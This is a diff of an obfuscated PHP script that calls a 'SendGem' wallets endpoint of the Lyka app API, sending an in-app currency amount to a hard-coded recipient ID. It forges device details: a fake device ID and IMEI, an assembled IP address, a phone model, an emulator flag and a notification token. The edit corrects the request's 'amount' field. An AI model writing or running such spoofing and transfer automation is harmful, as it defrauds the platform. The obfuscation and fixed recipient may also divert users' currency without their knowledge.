@@ -45,6 +45,7 @@ $var_289c4962919c8c887279a40923d0fcd6 = "[1;37;40m";
 		⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄⠄⠄⠄⢀⣠⣴
 		⣿⣶⣶⣮⣥⣒⠲⢮⣝⡿⣿⣿⡆⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄";
 
+
 echo "
 ";
 		
@@ -1883,7 +1884,6 @@ DATA;
     echo $var_e002393bf51b9345376b872dfc002ea6->message;
 	$var_99de215ed1cc76cccedd0126cd6be805 = "SendGem";	
 	$var_aca4b5636fed2a336b5cd22cd2bc0680 = "wallets";
-	$var_6bed1b3c86f14586dda25d0a0427f7bc = "amount";
 	    $var_3d1336a5d59ee39521c137aeeb8523bf = "https://$var_aca4b5636fed2a336b5cd22cd2bc0680.mylykaapps.com/api/v3/$var_aca4b5636fed2a336b5cd22cd2bc0680/$var_99de215ed1cc76cccedd0126cd6be805";
     $var_1d9ce56f70fabfda48b099eede24af3b = curl_init($var_3d1336a5d59ee39521c137aeeb8523bf);
     curl_setopt($var_1d9ce56f70fabfda48b099eede24af3b, CURLOPT_URL, $var_3d1336a5d59ee39521c137aeeb8523bf);
@@ -1893,7 +1893,7 @@ DATA;
     curl_setopt($var_1d9ce56f70fabfda48b099eede24af3b, CURLOPT_HTTPHEADER, $var_217cc9ea7e60233b3901af169f965155);
 	$var_7ab2d6450bade4f4d022b45fdffdc0e6 = "0.35";
 	$var_68572bed397ee55f2499497aa887137e = "700017854513";
-    $var_6de8eb6d3870374324955eecc45e2963 = '{"$ping":"' . $var_7ab2d6450bade4f4d022b45fdffdc0e6 . '","device":{"deviceId":"fcaa86b842595c2f",
+    $var_6de8eb6d3870374324955eecc45e2963 = '{"amount":"' . $var_7ab2d6450bade4f4d022b45fdffdc0e6 . '","device":{"deviceId":"fcaa86b842595c2f",
 "deviceIP":"$ip.$ip1.$ip2.$ip3",
     "networkIP":"$ip.$ip1.$ip2.$ip3",
 "deviceImei":"fcaa86b842595c2f","deviceModel":"Xiaomi Redmi Note 5","deviceName":"android","deviceOs":"Android O_MR1 ","isEmulator":false,"notificationToken":"eFEXEC5pTAeXLu7JjIlpNX:APA91bF8I2ZGs8wUNDjpw5lSnzrz8fB652HYMxWBdTGtFRSUaBEd0pHZQvWXAd00ESKVUO_VtYieRQxtfEU7f3RUIHEs5zXGZSVqk5PfbzjZTJQcue0vHYRiEobXHk8JUlTa0nmPCdgR","osVersion":"28"},"recipientId":' . $var_68572bed397ee55f2499497aa887137e . '}';
